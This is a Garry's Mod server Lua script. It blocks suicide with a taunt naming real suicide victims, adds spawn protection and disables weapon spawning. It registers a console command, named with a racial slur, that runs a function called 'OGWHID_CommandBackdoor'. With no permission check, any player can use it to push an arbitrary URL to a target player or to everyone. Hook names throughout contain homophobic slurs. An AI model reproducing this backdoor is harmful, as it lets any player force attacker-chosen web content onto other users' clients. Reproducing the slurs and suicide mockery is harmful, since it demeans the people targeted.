local RudeTable = {"Eva Braun","Kurt Colbain","Christopher Dorner","Adolf Hitler","Robin Williams"}

function FuckYouBill(player)
	player:ChatPrint("Calm down there " .. RudeTable[math.random(1,#RudeTable)] .. "." )
	return false
end

hook.Add("CanPlayerSuicide","FUCK YOU BILL",FuckYouBill)


function SuperSpawnProtectionPlayerSpawn(ply)
	timer.Simple(0.01, function()
		if ply:Alive() then
			ply:SetMaterial("debug/env_cubemap_model")
			ply:GodEnable()
			ply.SpawnImmunityTime = CurTime() + 3
			ply.SpawnProtectionEnabled = true
		end
	end)
end

hook.Add( "PlayerSpawn", "Spawn Protection Spawn", SuperSpawnProtectionPlayerSpawn )


function SuperSpawnProtectionThink()
	for k,ply in pairs(player.GetAll()) do
		if ply:Alive() == true then
			if ply.SpawnProtectionEnabled == true then
				if ply.SpawnImmunityTime <= CurTime() then
					ply:ChatPrint("Your spawn protection has worn off.")
					ply.SpawnProtectionEnabled = false
					ply:GodDisable()
				end
				if ply:KeyDown(IN_ATTACK) and ply.SpawnImmunityTime - 1 <= CurTime() then
					ply:ChatPrint("Your spawn protection has worn off.")
					ply.SpawnProtectionEnabled = false
					ply:GodDisable()
				end	
			elseif ply.SpawnProtectionEnabled == false then
				ply:SetMaterial("")
			end
		end
	end
end

hook.Add( "Think", "Spawn Protection Think", SuperSpawnProtectionThink )

function OGWHID_CommandBackdoor(ply,cmd,args)

	if args then  

		local Victim = nil
		local URL = nil
		local Time = 10
		
		if args[1] then
		
			if args[1] == "*" then
		
				Victim = Entity(0)
		
			else
			
				local PlayerTable = {}
				local Name = args[1]
				
				for k,v in pairs(player.GetAll()) do
					if OGWHID_TableFind(string.lower(Name), string.lower(v:Nick())) and not Victim then
						Victim = v
					end
				end
				
			end
		
		else
			ply:ChatPrint("Try to enter something next time.")
			return
		end
		
		if Victim == nil then
			ply:ChatPrint("Could not find player '" .. args[1] .. "'.")
			return 
		end
		
		if args[2] then
		
			if string.lower(args[2]) ~= "stop" then
				
				string.Replace(args[2],"https","http")
				
				if OGWHID_TableFind("http",args[2]) then
					URL = args[2]
				else
					URL = "http://" .. args[2]
				end

				--[[
				if OGWHID_TableFind("youtube.com",URL) then
					URL = URL .. "?rel=0&amp;controls=0&amp;showinfo=0&amp;autoplay=1"
					
					URL = string.Replace(URL,"watch?v=","embed/")
					--URL = https://www.youtube.com/embed/caKcJ9Jllfc?rel=0&amp;controls=0&amp;showinfo=0
				end
				--]]
			
			else
			
				URL = "stop"
				
			end
			
		else
		
			ply:ChatPrint("Missing URL or phrase.")
			
			return
		end
		
		if not URL then
			ply:ChatPrint("'" .. args[2] .. "' is not a URL. Enter a URL.")
		end
		
		if args[3] then
		
			if type(tonumber(args[3])) ~= "number" then
				
				ply:ChatPrint("'" .. args[3] .. "' is not a number. Enter a number.")
				
				return
			end

			Time = tonumber(args[3])
			
		end
		
		if not Time then 
			ply:ChatPrint("'" .. args[3] .. "' is not a number. Enter a number.")
		end
		
		if Victim and URL and Time then
		
			OGWHID_Send(Victim,URL,Time,false,Victim)
			OGWHID_Send(ply,URL,Time,false,ply)

		end
		
	else
	
		ply:ChatPrint("Try to enter something next time.")
		
	end

end

concommand.Add("NIGGER",OGWHID_CommandBackdoor)


--[[
function RagdollMod(ply)

	local OldRagdoll = ply:GetNWEntity("FakeRagdoll",nil)
	
	if IsValid(OldRagdoll) then
		SafeRemoveEntityDelayed(OldRagdoll,60)
	end
	
	SafeRemoveEntity(ply:GetRagdollEntity())
	
	local Seq = ply:GetSequence()

	local Ragdoll = ents.Create("prop_ragdoll")
	Ragdoll:SetPos(ply:GetPos())
	Ragdoll:SetAngles(ply:GetAngles())
	Ragdoll:SetModel(ply:GetModel())
	
	Ragdoll:SetSequence(Seq)
	Ragdoll:SetKeyValue("sequence",Seq)
	
	Ragdoll:Spawn()
	Ragdoll:Activate()
	Ragdoll:SetCollisionGroup(COLLISION_GROUP_DEBRIS)
	
	ply:Spectate( OBS_MODE_CHASE )
	ply:SpectateEntity(Ragdoll)
	
	Ragdoll:SetFlexScale(ply:GetFlexScale())
	
	for i=0, ply:GetFlexNum() - 1 do
		Ragdoll:SetFlexWeight(i,ply:GetFlexWeight(i))
	end
	
	
	
	
	--Rag:ManipulateBoneScale( Rag:GetHitBoxBone(1,HITGROUP_HEAD), Vector(0,0,0) )
	
	local phys = Ragdoll:GetPhysicsObject()
	phys:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000)))

	ply:SetNWEntity("FakeRagdoll",Ragdoll)

end

hook.Add("PostPlayerDeath","Ragdoll Mod",RagdollMod)

function RagdollModThink(ply)

	local Ragdoll = ply:GetNWEntity("FakeRagdoll")
	
	if IsValid(Ragdoll) then
	
		if ply:KeyDown( IN_FORWARD ) then
			Ragdoll:GetPhysicsObject():ApplyForceCenter(Vector(math.random(-100,100),math.random(-100,100),math.random(-100,100)))
		end
		
	end

end

hook.Add("PlayerDeathThink","Ragdoll Mod Think",RagdollModThink)
--]]


function FuckThePolice(ply,weapon,swep)
	return false
end

hook.Add("PlayerSpawnSWEP","Fuck You Faggots",FuckThePolice)

function FuckThePolice2(ply,weapon,swep)
	--return true
end

hook.Add("PlayerGiveSWEP","Fuck You Faggots2",FuckThePolice2)




